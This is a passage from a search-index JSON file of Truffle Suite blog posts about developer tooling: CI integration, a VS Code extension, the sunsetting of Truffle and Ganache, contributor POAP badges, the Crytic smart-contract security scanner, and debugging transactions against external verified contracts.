{"location": "blog/bring-your-own-ci-byoci-with-truffle-teams/#using-an-existing-ci-service", "text": "The BUILDS settings screen Enabling external CI for a repository only requires a single checkbox! Navigate to your user or organization\u2019s settings page by clicking the user/org icon in the navbar. From there, click the BUILDS tab, then check the checkbox next to the repository of your choice! Build with external CI enabled Now, when you navigate to the builds page for that repository, any new builds will show a list of your GitHub-integrated build services, along with their respective statuses. For more detailed information on the external CI service, check out our documentation here . For more detailed information on adding services to GitHub via their Marketplace, check out the GitHub Marketplace docs here .", "title": "Using an Existing CI Service"}, {"location": "blog/bring-your-own-ci-byoci-with-truffle-teams/#future-integration", "text": "We want Truffle Teams to be the most effective devops tool in the blockchain space for both new and existing teams. Let us know what you think about this integration solution, and if your team has other needs we haven\u2019t met yet. Thanks! Josh Quintal -- Head of Product & Marketing, Truffle Suite", "title": "Future Integration"}, {"location": "blog/build-on-web3-with-truffle-vs-code-extension/", "text": "By Kingsley Arinze We're excited to announce the release of Truffle for VS Code, an extension that allows newbies and experienced web3 developers to code, debug, and deploy their smart contracts without needing to leave VS Code. Some of its key features include: You can start a new Truffle project from scratch or from a Truffle Box You can deploy your smart contract easily by connecting to your Infura account and fetching all your existing projects with their corresponding networks' RPC endpoints. You can also create new Infura projects from VS Code You can debug a transaction using the native VS Code debugger instead of the command line You can connect to Ganache local blockchain and deploy smart contracts from a user interface without leaving VS Code Instead of performing these tasks via the command line, VS Code users can seamlessly use a single interface, improving the user experience and speeding up the development process. VS Code remains one of the most popular code editors available today. Created by Microsoft, this code editor is available for free on all major Operating Systems and houses a lot of extensions that help simplify workflows. Extensions on VS Code are created by Microsoft or independent teams/developers. The Truffle for VS Code extension was originally started by Microsoft as the Blockchain Development Kit for Ethereum and through the partnership , with Truffle, Microsoft transitioned the management of the extension to the Truffle team. In summary, this extension is designed to help VS Code users build, debug, and deploy smart contracts on the Ethereum blockchain using the Truffle suite of tools. Installing the VS Code Extension for Truffle \u00b6 The easiest way to get started is by browsing the VS Code built-in marketplace tab. Search for Truffle for VS Code , and click the install button. An alternative way is to visit the VS Code marketplace and install directly from the website. Upon installation, you will get a prompt to download some dependencies or upgrade the versions you already have to newer versions. The Truffle for VS Code extension surfaces in the following areas in VS Code, each with different sets of commands: The VS Code command palette (SHIFT + CMD + P): here, you can perform tasks such as: Creating a new Solidity project Creating and connecting to a new network Starting and stopping Ganache local blockchain Debugging transactions using VS Code native debugger The VS Code context menu (Right-click on a .sol file): here, you can perform tasks such as: Adding a new contract from OpenZeppelin Building your contracts Deploying your contracts to your network of choice The VS Code Tree view (Under the Explorer tab): here, you can create and connect to an Infura or Ganache network without leaving the VS Code application Try these features! \u00b6 1. Preview version of the Truffle Debugger with native VS Code support \u00b6 The Truffle Debugger uses the native VS Code debugging feature, allowing VS Code users to debug their transactions in the ways they are familiar with: visually stepping through the code to understand how it behaves. To start debugging a transaction using the extension, open the command palette with SHIFT + CMD + P and select \" Truffle: Debug Transaction \". The extension would list all the previously run transactions in chronological order. Clicking on any transaction starts the debugging process, and you can step through to gain more insight into that transaction. 2. Sign in to your Infura account and deploy contracts without setting up a new network in your Truffle config file \u00b6 With this extension, you no longer need to leave the VS Code application to create a new Infura project or deploy to an existing Infura project. Instead, you can sign in to your Infura account from VS Code by simply clicking a button. This would list all your Infura projects and their corresponding network RPC endpoints. With Infura set up, you can right-click on a contract, select the \"Deploy contracts\" option, and pick a Project/Network combination to deploy your contract to. The extension outputs information about your contract deployments to the Output tab on the VS Code command line. You also need to ensure that its reading outputs from \" Truffle for VS Code \". 3. Connect to Ganache local blockchain and deploy contracts from a user interface without leaving VS Code \u00b6 The VS Code extension allows you to start, stop, and deploy smart contracts to the Ganache local blockchain without leaving the VS Code application. Simply create a new Ganache network under the \"Truffle Networks\" tab, and right-click to see the start/stop menu. With Ganache running, you can right-click on your smart contract file and select the \" Deploy Contracts \" option. This would list all the available networks, including those from your truffle-config file and networks you created using the extension (Infura and Ganache). Next, select the Ganache network and watch the extension deploy your contract to Ganache. That\u2019s it, now you have all you need to start building the right way! This extension provides a uniform interface for all things smart contracts which we believe can be helpful in onboarding newbies into web3 and improving the workflow for more experienced developers. Get started with the extension today by visiting the VS Code built-in marketplace and searching for Truffle for VS Code . We plan to have a dedicated VS Code tab for the extension in the future to improve the discoverability of libraries and security tools. We appreciate any feedback you might have concerning the extension. Feel free to shoot us a tweet/dm at @trufflesuite .", "title": "Build on Web3 with the Truffle for VS Code extension"}, {"location": "blog/build-on-web3-with-truffle-vs-code-extension/#installing-the-vs-code-extension-for-truffle", "text": "The easiest way to get started is by browsing the VS Code built-in marketplace tab. Search for Truffle for VS Code , and click the install button. An alternative way is to visit the VS Code marketplace and install directly from the website. Upon installation, you will get a prompt to download some dependencies or upgrade the versions you already have to newer versions. The Truffle for VS Code extension surfaces in the following areas in VS Code, each with different sets of commands: The VS Code command palette (SHIFT + CMD + P): here, you can perform tasks such as: Creating a new Solidity project Creating and connecting to a new network Starting and stopping Ganache local blockchain Debugging transactions using VS Code native debugger The VS Code context menu (Right-click on a .sol file): here, you can perform tasks such as: Adding a new contract from OpenZeppelin Building your contracts Deploying your contracts to your network of choice The VS Code Tree view (Under the Explorer tab): here, you can create and connect to an Infura or Ganache network without leaving the VS Code application", "title": "Installing the VS Code Extension for Truffle"}, {"location": "blog/build-on-web3-with-truffle-vs-code-extension/#try-these-features", "text": "", "title": "Try these features!"}, {"location": "blog/build-on-web3-with-truffle-vs-code-extension/#1-preview-version-of-the-truffle-debugger-with-native-vs-code-support", "text": "The Truffle Debugger uses the native VS Code debugging feature, allowing VS Code users to debug their transactions in the ways they are familiar with: visually stepping through the code to understand how it behaves. To start debugging a transaction using the extension, open the command palette with SHIFT + CMD + P and select \" Truffle: Debug Transaction \". The extension would list all the previously run transactions in chronological order. Clicking on any transaction starts the debugging process, and you can step through to gain more insight into that transaction.", "title": "1. Preview version of the Truffle Debugger with native VS Code support"}, {"location": "blog/build-on-web3-with-truffle-vs-code-extension/#2-sign-in-to-your-infura-account-and-deploy-contracts-without-setting-up-a-new-network-in-your-truffle-config-file", "text": "With this extension, you no longer need to leave the VS Code application to create a new Infura project or deploy to an existing Infura project. Instead, you can sign in to your Infura account from VS Code by simply clicking a button. This would list all your Infura projects and their corresponding network RPC endpoints. With Infura set up, you can right-click on a contract, select the \"Deploy contracts\" option, and pick a Project/Network combination to deploy your contract to. The extension outputs information about your contract deployments to the Output tab on the VS Code command line. You also need to ensure that its reading outputs from \" Truffle for VS Code \".", "title": "2. Sign in to your Infura account and deploy contracts without setting up a new network in your Truffle config file"}, {"location": "blog/build-on-web3-with-truffle-vs-code-extension/#3-connect-to-ganache-local-blockchain-and-deploy-contracts-from-a-user-interface-without-leaving-vs-code", "text": "The VS Code extension allows you to start, stop, and deploy smart contracts to the Ganache local blockchain without leaving the VS Code application. Simply create a new Ganache network under the \"Truffle Networks\" tab, and right-click to see the start/stop menu. With Ganache running, you can right-click on your smart contract file and select the \" Deploy Contracts \" option. This would list all the available networks, including those from your truffle-config file and networks you created using the extension (Infura and Ganache). Next, select the Ganache network and watch the extension deploy your contract to Ganache. That\u2019s it, now you have all you need to start building the right way! This extension provides a uniform interface for all things smart contracts which we believe can be helpful in onboarding newbies into web3 and improving the workflow for more experienced developers. Get started with the extension today by visiting the VS Code built-in marketplace and searching for Truffle for VS Code . We plan to have a dedicated VS Code tab for the extension in the future to improve the discoverability of libraries and security tools. We appreciate any feedback you might have concerning the extension. Feel free to shoot us a tweet/dm at @trufflesuite .", "title": "3. Connect to Ganache local blockchain and deploy contracts from a user interface without leaving VS Code"}, {"location": "blog/consensys-announces-the-sunset-of-truffle-and-ganache-and-new-hardhat-partnership/", "text": "By Kingsley Arinze Today, Consensys announces the sunsetting of web3 pioneering dev tools, Truffle and Ganache, and welcomes new support for developers with a HardHat partnership. Empowering developers to build on Ethereum has always been at the core of the Consensys mission and supporting web3 builders is our top priority. To focus our energy on partners in the Ethereum ecosystem, we have decided to sunset Truffle and Ganache and to empower developers to build dapps using MetaMask tooling like Snaps and the SDK. We recognize the integral role Truffle and Ganache have played in many Ethereum projects and will be partnering with HardHat to provide a smooth transition process for all developers currently using them. We are committed to supporting Truffle and Ganache users as they transition to HardHat, Foundry, and other ecosystem tools like Remix, Thirdweb, and OpenZeppelin. Next steps for developers using Truffle and Ganache \u00b6 At Consensys, our vision for web3 is expansive and ambitious. We are investing in new tools and APIs to empower developers to build powerful dapps with MetaMask , Infura , and Linea , which is why the Truffle engineering team will join these teams to accelerate the build out of their developer offerings. For developers currently using Truffle and Ganache, we\u2019re proud to be partnering with HardHat to offer migration and ongoing support in the following ways: Migration Path : In collaboration with HardHat, we'll provide documentation outlining the migration process from Truffle to HardHat. We will also provide guidance and support to devs interested in using other popular ecosystem tools, like Foundry. Product Support : Truffle and Ganache support will be available for the next 90 days through Zendesk , Truffle G itHub discussions , Ganache GitHub discussions , and Consensys Discord . Codebase's Future : Starting on December 20, 2023, Truffle and Ganache codebases will remain available as public archives. This gives developers around 90 days to migrate to HardHat and other solutions. Community Q+A : Join us on September 27th for an open community Q&A session. Submit your questions here in advance. Forever grateful to Truffle and Ganache \u00b6 Since their inception, Truffle and Ganache have been more than just tools. They were beacons in the Ethereum ecosystem that have enabled developers to create, test, and deploy Solidity smart contracts with ease. Their functionality democratized Ethereum's potential, making dapp development simple and accessible. Truffle and Ganache fueled a wave of web3 advancements, enabling teams across the ecosystem to build some of the most innovative projects on Ethereum. And for this, we will be forever grateful and look forward to supporting builders who are bringing the promise of web3 to life now and always. FAQ \u00b6 Why sunset Truffle and Ganache? Consensys is constantly evaluating how it can best support web3 builders and has seen incredible growth in demand and potential for our Infura, MetaMask Snaps, and SDK offerings. Consensys is shifting the Truffle team to focus on scaling those offerings and helping developers build with and for MetaMask. To support projects currently using Truffle and Ganache, Consensys is collaborating with Hardhat to migrate Truffle and Ganache users and move the codebases to a public archive. What migration support is available? Consensys recommends migrating from using Truffle and Ganache within the 3-month deprecation period to ensure the tooling being used is actively maintained and dependencies being updated. A full migration guide has been published here with step-by-step instructions on how to migrate your project to Hardhat. Consensys will maintain the Truffle documentation pages, archiving them along with the codebase for future reference and will be available in support channels ( Zendesk , GitHub discussions , and Consensys Discord ). to answer questions related to migrating. HardHat's support will also be ready to assist on their #migrating-to-hardhat Discord channel. How long will current Truffle users receive support? Nothing will change for the next 90 days and we are committed to working with our partners at Hardhat to support users as they migrate. For users who do not plan to migrate, the current codebases and documentation will remain available as public archives indefinitely. Ganache will not be upgraded to support the next hard fork that is currently planned for December. How will Consensys continue to support developers? Consensys is constantly evaluating how we can uniquely serve and empower developers. With a constellation of developer tools emerging in our ecosystem, including leaders like Hardhat, builders have never had more options for writing, testing and deploying smart contracts. Sunsetting Truffle and Ganache allow us to focus our teams on building out MetaMask as a platform and empowering developers around the world to build impactful dapps using the MetaMask SDK, Snaps, and our library of APIs and Infura endpoints. What will happen to the Truffle team? The engineering and product teams have moved internally to developer-focused offerings within MetaMask and Infura, where they will continue their work enabling web3 builders. Where can I learn more? We are hosting a community AMA on September 27, and you can submit your questions here . You can also ask questions in the interim on GitHub discussions .", "title": "Consensys Announces the Sunset of Truffle and Ganache and New HardHat Partnership"}, {"location": "blog/consensys-announces-the-sunset-of-truffle-and-ganache-and-new-hardhat-partnership/#next-steps-for-developers-using-truffle-and-ganache", "text": "At Consensys, our vision for web3 is expansive and ambitious. We are investing in new tools and APIs to empower developers to build powerful dapps with MetaMask , Infura , and Linea , which is why the Truffle engineering team will join these teams to accelerate the build out of their developer offerings. For developers currently using Truffle and Ganache, we\u2019re proud to be partnering with HardHat to offer migration and ongoing support in the following ways: Migration Path : In collaboration with HardHat, we'll provide documentation outlining the migration process from Truffle to HardHat. We will also provide guidance and support to devs interested in using other popular ecosystem tools, like Foundry. Product Support : Truffle and Ganache support will be available for the next 90 days through Zendesk , Truffle G itHub discussions , Ganache GitHub discussions , and Consensys Discord . Codebase's Future : Starting on December 20, 2023, Truffle and Ganache codebases will remain available as public archives. This gives developers around 90 days to migrate to HardHat and other solutions. Community Q+A : Join us on September 27th for an open community Q&A session. Submit your questions here in advance.", "title": "Next steps for developers using Truffle and Ganache"}, {"location": "blog/consensys-announces-the-sunset-of-truffle-and-ganache-and-new-hardhat-partnership/#forever-grateful-to-truffle-and-ganache", "text": "Since their inception, Truffle and Ganache have been more than just tools. They were beacons in the Ethereum ecosystem that have enabled developers to create, test, and deploy Solidity smart contracts with ease. Their functionality democratized Ethereum's potential, making dapp development simple and accessible. Truffle and Ganache fueled a wave of web3 advancements, enabling teams across the ecosystem to build some of the most innovative projects on Ethereum. And for this, we will be forever grateful and look forward to supporting builders who are bringing the promise of web3 to life now and always.", "title": "Forever grateful to Truffle and Ganache"}, {"location": "blog/consensys-announces-the-sunset-of-truffle-and-ganache-and-new-hardhat-partnership/#faq", "text": "Why sunset Truffle and Ganache? Consensys is constantly evaluating how it can best support web3 builders and has seen incredible growth in demand and potential for our Infura, MetaMask Snaps, and SDK offerings. Consensys is shifting the Truffle team to focus on scaling those offerings and helping developers build with and for MetaMask. To support projects currently using Truffle and Ganache, Consensys is collaborating with Hardhat to migrate Truffle and Ganache users and move the codebases to a public archive. What migration support is available? Consensys recommends migrating from using Truffle and Ganache within the 3-month deprecation period to ensure the tooling being used is actively maintained and dependencies being updated. A full migration guide has been published here with step-by-step instructions on how to migrate your project to Hardhat. Consensys will maintain the Truffle documentation pages, archiving them along with the codebase for future reference and will be available in support channels ( Zendesk , GitHub discussions , and Consensys Discord ). to answer questions related to migrating. HardHat's support will also be ready to assist on their #migrating-to-hardhat Discord channel. How long will current Truffle users receive support? Nothing will change for the next 90 days and we are committed to working with our partners at Hardhat to support users as they migrate. For users who do not plan to migrate, the current codebases and documentation will remain available as public archives indefinitely. Ganache will not be upgraded to support the next hard fork that is currently planned for December. How will Consensys continue to support developers? Consensys is constantly evaluating how we can uniquely serve and empower developers. With a constellation of developer tools emerging in our ecosystem, including leaders like Hardhat, builders have never had more options for writing, testing and deploying smart contracts. Sunsetting Truffle and Ganache allow us to focus our teams on building out MetaMask as a platform and empowering developers around the world to build impactful dapps using the MetaMask SDK, Snaps, and our library of APIs and Infura endpoints. What will happen to the Truffle team? The engineering and product teams have moved internally to developer-focused offerings within MetaMask and Infura, where they will continue their work enabling web3 builders. Where can I learn more? We are hosting a community AMA on September 27, and you can submit your questions here . You can also ask questions in the interim on GitHub discussions .", "title": "FAQ"}, {"location": "blog/contributors-youve-earned-a-gitpoap/", "text": "By Kingsley Arinze Hey Trufflesuite contributors, we\u2019re excited to share that in collaboration with the GitPOAP team, we will be issuing POAPs in appreciation of your awesome contributions over the years. What are POAPs? \u00b6 POAPs (Proof Of Attendance Protocol) are badges issued as NFTs (non-fungible token) to prove that the recipient/owner has carried out an action or has attended an event. They are like gold medals from the Olympics, except these exist as digital collectibles. Who's eligible to claim a GitPOAP? \u00b6 Great question. Annual contributor POAPs will be issued to those who have contributed one or more times since since the start of the following projects: Ganache Truffle trufflesuite.com website Those of you who have contributed to all three projects can claim all three POAPs! Here are some POAPs you should expect to receive as a Trufflesuite contributor: How and when can I claim my POAP? \u00b6 POAPs will be issued as NFTs, so contributors must authenticate with their GitHub accounts on the GitPOAP website to claim their POAP. All POAPs are minted on Gnosis Chain (formerly xDai). There is no cost to claim a POAP and it can be migrated to Ethereum Mainnet by sending a transaction. Visit how do I migrate my POAP to Mainnet for instructions. The official start date for claiming is April 7, 2022, so mark your calendars and claim your GitPOAP as soon as possible. Thanks to the GitPOAP team for selecting Truffle as one of the lucky few projects in their launch cohort.", "title": "Hey Trufflesuite contributors, you\u2019ve earned a POAP!"}, {"location": "blog/contributors-youve-earned-a-gitpoap/#what-are-poaps", "text": "POAPs (Proof Of Attendance Protocol) are badges issued as NFTs (non-fungible token) to prove that the recipient/owner has carried out an action or has attended an event. They are like gold medals from the Olympics, except these exist as digital collectibles.", "title": "What are POAPs?"}, {"location": "blog/contributors-youve-earned-a-gitpoap/#whos-eligible-to-claim-a-gitpoap", "text": "Great question. Annual contributor POAPs will be issued to those who have contributed one or more times since since the start of the following projects: Ganache Truffle trufflesuite.com website Those of you who have contributed to all three projects can claim all three POAPs! Here are some POAPs you should expect to receive as a Trufflesuite contributor:", "title": "Who's eligible to claim a GitPOAP?"}, {"location": "blog/contributors-youve-earned-a-gitpoap/#how-and-when-can-i-claim-my-poap", "text": "POAPs will be issued as NFTs, so contributors must authenticate with their GitHub accounts on the GitPOAP website to claim their POAP. All POAPs are minted on Gnosis Chain (formerly xDai). There is no cost to claim a POAP and it can be migrated to Ethereum Mainnet by sending a transaction. Visit how do I migrate my POAP to Mainnet for instructions. The official start date for claiming is April 7, 2022, so mark your calendars and claim your GitPOAP as soon as possible. Thanks to the GitPOAP team for selecting Truffle as one of the lucky few projects in their launch cohort.", "title": "How and when can I claim my POAP?"}, {"location": "blog/crytic-continuous-assurance-for-smart-contracts/", "text": "We are proud to announce our new Smart contract security product: https://crytic.io/ . Crytic provides continuous assurance for smart contracts. The platform reports build status on every commit and runs a suite of security analyses for immediate feedback. The beta access will be open soon. Follow us on twitter to be notified and benefit from the service as soon as possible! The first three months are free. How Crytic will secure your smart contracts \u00b6 Once connected to your GitHub repository, Crytic will: Run our static analyzer Slither , which detects the most common smart contracts vulnerabilities and will save you from critical mistakes. Run your Truffle tests continuously to ensure that no bug is added while developing your project. Slither will analyze your codebase for more than 60 security flaws, including reentrancy, integer overflows, race conditions, and many others. Half of these flaw-detectors are private and were not available to the public. They can detect flaws for which public knowledge is limited and that no other tool can find. The recent GridLock bug would have been detected ahead of time using Crytic! We built this platform for developers, so we integrated it with GitHub. It will watch every commit and branch to ensure that bugs are not added during development. In addition, Crytic will run the checks on every PR to facilitate your code review. For every security issue found, Crytic will: Show you a detailed report on the bug, including source-code highlighting. Allow you to create a GitHub issue to keep track of the fixes easily. Let you triage the results, so you can decide what needs to be fixed. Quick Walkthrough \u00b6 Adding Crytic to your system is straightforward: you just need to connect to your GitHub repository. We have first-class support for Truffle; it works out of the box! We also support most of the other smart contract platforms, including Embark, Dapp, and Etherlime. After adding your repository, the dashboard (Figure 1) will show you a summary of the project, like this crytic-demo : Figure 1: Crytic Dashboard From now on, you will benefit from continuous security analyses. Issue reports \u00b6 Finding an issue is only the first part. Crytic will provide you with detailed information you need about the bug to fix it: Figure 2: Report A careful reader will notice the vulnerability here: function constuctor creates a public function (with a typo!) that is callable by anyone instead of being run only at initialization. Crytic will detect these types of critical mistakes instantaneously. Triaging issues \u00b6 Once a bug has been found, the user can decide to: create a GitHub issue, to easily keep track of the fix, or discard the issue. Figure 3: GitHub Issue Generated Crytic follows the modifications to your code and reports only new bugs that are introduced. Each new PR will be analyzed automatically: Figure 4: Pull Request Integration What\u2019s next for Crytic \u00b6 We are constantly improving Crytic. Expect to see new bug detectors and new features in the future. We are planning to add: Echidna and Manticore integration: to ensure your code is checked for custom security properties. Automatic bug repair: Crytic will propose patches to fix the issues it finds. Slither printer integration : to help visualize the underlying details of your code. Delegatecall proxy checker : to prevent you from making critical\u2014and all too common\u2014mistakes in your upgradeability process . Questions? Bring them to TruffleCon, and pose them to us at our booth or at our Friday workshop on automated vulnerability detection tools ! Whether or not you can make it to TruffleCon, join our slack channel (#crytic) for support, and watch @CryticCI to find out as soon as our beta is open.", "title": "Crytic - Continuous Assurance for Smart Contracts"}, {"location": "blog/crytic-continuous-assurance-for-smart-contracts/#how-crytic-will-secure-your-smart-contracts", "text": "Once connected to your GitHub repository, Crytic will: Run our static analyzer Slither , which detects the most common smart contracts vulnerabilities and will save you from critical mistakes. Run your Truffle tests continuously to ensure that no bug is added while developing your project. Slither will analyze your codebase for more than 60 security flaws, including reentrancy, integer overflows, race conditions, and many others. Half of these flaw-detectors are private and were not available to the public. They can detect flaws for which public knowledge is limited and that no other tool can find. The recent GridLock bug would have been detected ahead of time using Crytic! We built this platform for developers, so we integrated it with GitHub. It will watch every commit and branch to ensure that bugs are not added during development. In addition, Crytic will run the checks on every PR to facilitate your code review. For every security issue found, Crytic will: Show you a detailed report on the bug, including source-code highlighting. Allow you to create a GitHub issue to keep track of the fixes easily. Let you triage the results, so you can decide what needs to be fixed.", "title": "How Crytic will secure your smart contracts"}, {"location": "blog/crytic-continuous-assurance-for-smart-contracts/#quick-walkthrough", "text": "Adding Crytic to your system is straightforward: you just need to connect to your GitHub repository. We have first-class support for Truffle; it works out of the box! We also support most of the other smart contract platforms, including Embark, Dapp, and Etherlime. After adding your repository, the dashboard (Figure 1) will show you a summary of the project, like this crytic-demo : Figure 1: Crytic Dashboard From now on, you will benefit from continuous security analyses.", "title": "Quick Walkthrough"}, {"location": "blog/crytic-continuous-assurance-for-smart-contracts/#issue-reports", "text": "Finding an issue is only the first part. Crytic will provide you with detailed information you need about the bug to fix it: Figure 2: Report A careful reader will notice the vulnerability here: function constuctor creates a public function (with a typo!) that is callable by anyone instead of being run only at initialization. Crytic will detect these types of critical mistakes instantaneously.", "title": "Issue reports"}, {"location": "blog/crytic-continuous-assurance-for-smart-contracts/#triaging-issues", "text": "Once a bug has been found, the user can decide to: create a GitHub issue, to easily keep track of the fix, or discard the issue. Figure 3: GitHub Issue Generated Crytic follows the modifications to your code and reports only new bugs that are introduced. Each new PR will be analyzed automatically: Figure 4: Pull Request Integration", "title": "Triaging issues"}, {"location": "blog/crytic-continuous-assurance-for-smart-contracts/#whats-next-for-crytic", "text": "We are constantly improving Crytic. Expect to see new bug detectors and new features in the future. We are planning to add: Echidna and Manticore integration: to ensure your code is checked for custom security properties. Automatic bug repair: Crytic will propose patches to fix the issues it finds. Slither printer integration : to help visualize the underlying details of your code. Delegatecall proxy checker : to prevent you from making critical\u2014and all too common\u2014mistakes in your upgradeability process . Questions? Bring them to TruffleCon, and pose them to us at our booth or at our Friday workshop on automated vulnerability detection tools ! Whether or not you can make it to TruffleCon, join our slack channel (#crytic) for support, and watch @CryticCI to find out as soon as our beta is open.", "title": "What\u2019s next for Crytic"}, {"location": "blog/debug-quickly-and-in-context-with-truffle-teams-new-debugger/", "text": "If you've used Truffle's debugger, you know it's best-in-class. Until now though, it's been confined to the command line. Today the debugger breaks out of the console to a GUI within Truffle Teams! This is a huge workflow enhancement--allowing us to debug transactions in the places we're already viewing--via the deployment details screen or while monitoring individual contracts. Let's take a look! Note : To use the debugger right away, you'll need to opt-in to Truffle Teams Early Access . Launching the Debugger \u00b6 To launch the debugger, we just need to find a transaction. Head over to the Deployments screen and select a deployment. From there select the transactions tab or click the monitoring button for a contract. You'll notice there's a debug button on each transaction card; clicking it will open the Truffle Teams debugger. Debugging is only a click away! ## Navigating the UI Starting at the top, you'll see the transaction hash along with an icon noting its status and, if applicable, the accompanying error message (1). Below that we have our functions, from left to right: Step Next, Step Over, Step In, Step Out, and Reset (2). Next we have some tabs showing the contracts included in this transaction (3). Finally we have two panes, one showing our Solidity with the current step highlighted in yellow (4). The second with our variables (5). Debugging a failed transaction. At the moment some other enhancements, including breakpoints and syntax highlighting, are coming soon. We wanted to get this powerful feature in your hands as quickly as possible, so we're releasing it now via Early Access. For more information on what to expect from early access, check out [the Truffle Teams Early Access blog post](/blog/try-new-features-first-with-truffle-teams-early-access). For more information, check out [the Truffle Teams Debugger docs](/docs/teams/debugger/debugging-a-transaction) or for general information about Truffle's debugger, check out [the Truffle Debugger docs](/docs/truffle/getting-started/debugging-your-contracts). CHECK OUT THE TRUFFLE TEAMS DEBUGGER ## Continue the Conversation We want Truffle Teams to be the most effective DevOps tool in the blockchain space for both new and existing teams. Let us know what you think about the new deployment views, or if your team has other needs we haven't met yet. Continue the conversation with your fellow Trufflers in our Slack community! SIGN UP FOR THE TRUFFLER SLACK Thanks! _Josh Quintal, Head of Product & Marketing_", "title": "Debug Quickly and in Context with Truffle Teams New Debugger"}, {"location": "blog/debug-quickly-and-in-context-with-truffle-teams-new-debugger/#launching-the-debugger", "text": "To launch the debugger, we just need to find a transaction. Head over to the Deployments screen and select a deployment. From there select the transactions tab or click the monitoring button for a contract. You'll notice there's a debug button on each transaction card; clicking it will open the Truffle Teams debugger. Debugging is only a click away! ## Navigating the UI Starting at the top, you'll see the transaction hash along with an icon noting its status and, if applicable, the accompanying error message (1). Below that we have our functions, from left to right: Step Next, Step Over, Step In, Step Out, and Reset (2). Next we have some tabs showing the contracts included in this transaction (3). Finally we have two panes, one showing our Solidity with the current step highlighted in yellow (4). The second with our variables (5). Debugging a failed transaction. At the moment some other enhancements, including breakpoints and syntax highlighting, are coming soon. We wanted to get this powerful feature in your hands as quickly as possible, so we're releasing it now via Early Access. For more information on what to expect from early access, check out [the Truffle Teams Early Access blog post](/blog/try-new-features-first-with-truffle-teams-early-access). For more information, check out [the Truffle Teams Debugger docs](/docs/teams/debugger/debugging-a-transaction) or for general information about Truffle's debugger, check out [the Truffle Debugger docs](/docs/truffle/getting-started/debugging-your-contracts). CHECK OUT THE TRUFFLE TEAMS DEBUGGER ## Continue the Conversation We want Truffle Teams to be the most effective DevOps tool in the blockchain space for both new and existing teams. Let us know what you think about the new deployment views, or if your team has other needs we haven't met yet. Continue the conversation with your fellow Trufflers in our Slack community! SIGN UP FOR THE TRUFFLER SLACK Thanks! _Josh Quintal, Head of Product & Marketing_", "title": "Launching the Debugger"}, {"location": "blog/debugging-verified-external-contracts-with-truffle-debugger/", "text": "Let's say you're crafting a clever flashloan transaction that interacts with five different DeFi dapps -- but on trying it, it doesn't work as expected. You open the transaction in Truffle Debugger to get a closer look at what went wrong. But how will you debug a transaction that the debugger doesn't have the source code for? Well, new in Truffle release v5.1.29 is the debugger's --fetch-external flag! This new flag tells the debugger to search Etherscan's repository of verified contracts and automatically download and compile those sources. As long as all the contracts you're interacting with are verified on Etherscan, you're good to go! This means you'll be able to debug Mainnet / G\u00f6rli / Ropsten / etc. transactions that interact with external contracts without the need to have external contract source code available locally ! Now, before you get too excited, some caveats apply: - This only works with Solidity contracts, since @truffle/debugger only supports Solidity at this time. - While using this feature, you won't be able to load and unload transactions in the debugger like normal; you'll have to quit and restart to change transactions. - In order to be able to use the debugger and have it find the right source to download for your network, you'll need to connect to an archive node that offers the debug_traceTransaction JSON RPC method. (See Geth's Management APIs ). That last one is a pretty big caveat, but there's good news here ! Our sibling SaaS project, Truffle Teams , now lets you simulate live networks via the free Sandbox feature. This works without requiring you to run your own node or to pay for someone else to run their own node, since Truffle Teams offers 1 free sandbox per GitHub organization! Of course, you're free to use the debugger with whatever compatible Ethereum node you like, including command-line Ganache; but here's how to use Truffle Teams, which offers so much more, for this feature. Example: Debug ENS in a [mostly] empty Truffle project! \u00b6 Click to enlarge This screenshot shows truffle debug stepping through a G\u00f6rli transaction to the ENS registry. Once you upgrade to Truffle v5.1.29, you can recreate this by doing the following: Find the G\u00f6rli ENS contract page on Etherscan . Find a recent transaction hash. (See example from screenshot .) Sign up / login to Truffle Teams and make a free Sandbox that forks off G\u00f6rli. Note : At the moment, you'll have to make sure that you manually specify that the Sandbox should use the same network ID as the chain it's forked from (in this case, 5). In the future, however, this step will be handled automatically. You can read more about Sandboxes in our earlier blog post on the subject . Copy your sandbox JSON RPC url to the clipboard. Run truffle init and add this to your new truffle-config.js (replacing \"<paste RPC url>\" with your clipboard contents from step 4): module . exports = { /* ... rest of truffle-config.js ... */ networks : { /* ... rest of networks ... */ sandbox : { url : \"<paste RPC url>\" , network_id : 5 } } } 5a. Optional . If you have an Etherscan API key or feel like making one, you can specify that as well in your truffle-config.js to speed up downloads: module . exports = { /* ... rest of truffle-config.js ... */ etherscan : { // replace this with your API key apiKey : \"0123456789abcdef0123456789abcdef\" } } Copy the transaction hash from step 2 and run the following (replacing <transaction hash> with the 0x -prefixed transaction hash): truffle debug <transaction hash> --network sandbox --fetch-external And that's it! You're now debugging an ENS transaction in an empty Truffle project. You can step through and set breakpoints; inspect both decoded variables and the raw binary state; and get return values, revert messages, and stacktraces just like normal. Now this example is a minimal one just to show how things work. But it will work just as well in your existing projects on transactions that feature your contracts in your project interacting with external verified contracts deployed on live networks. Right now \"verified contracts\" just means contracts verified on Etherscan, but we're also looking at supporting the new Sourcify project, which provides a more decentralized alternative to Etherscan's repository. We plan to add this in an upcoming release. But as of right now, you can use this feature with Etherscan's large library of verified contracts! Update : As of Truffle v5.1.32, Sourcify is now supported! Truffle Debugger will now check both Etherscan and Sourcify for verified contract sources! Hope you find this as exciting as we do! Thanks for using Truffle!", "title": "Debugging verified external contracts with Truffle Debugger"}, {"location": "blog/debugging-verified-external-contracts-with-truffle-debugger/#example-debug-ens-in-a-mostly-empty-truffle-project", "text": "Click to enlarge This screenshot shows truffle debug stepping through a G\u00f6rli transaction to the ENS registry. Once you upgrade to Truffle v5.1.29, you can recreate this by doing the following: Find the G\u00f6rli ENS contract page on Etherscan . Find a recent transaction hash. (See example from screenshot .) Sign up / login to Truffle Teams and make a free Sandbox that forks off G\u00f6rli. Note : At the moment, you'll have to make sure that you manually specify that the Sandbox should use the same network ID as the chain it's forked from (in this case, 5). In the future, however, this step will be handled automatically. You can read more about Sandboxes in our earlier blog post on the subject . Copy your sandbox JSON RPC url to the clipboard. Run truffle init and add this to your new truffle-config.js (replacing \"<paste RPC url>\" with your clipboard contents from step 4): module . exports = { /* ... rest of truffle-config.js ... */ networks : { /* ... rest of networks ... */ sandbox : { url : \"<paste RPC url>\" , network_id : 5 } } } 5a. Optional . If you have an Etherscan API key or feel like making one, you can specify that as well in your truffle-config.js to speed up downloads: module . exports = { /* ... rest of truffle-config.js ... */ etherscan : { // replace this with your API key apiKey : \"0123456789abcdef0123456789abcdef\" } } Copy the transaction hash from step 2 and run the following (replacing <transaction hash> with the 0x -prefixed transaction hash): truffle debug <transaction hash> --network sandbox --fetch-external And that's it! You're now debugging an ENS transaction in an 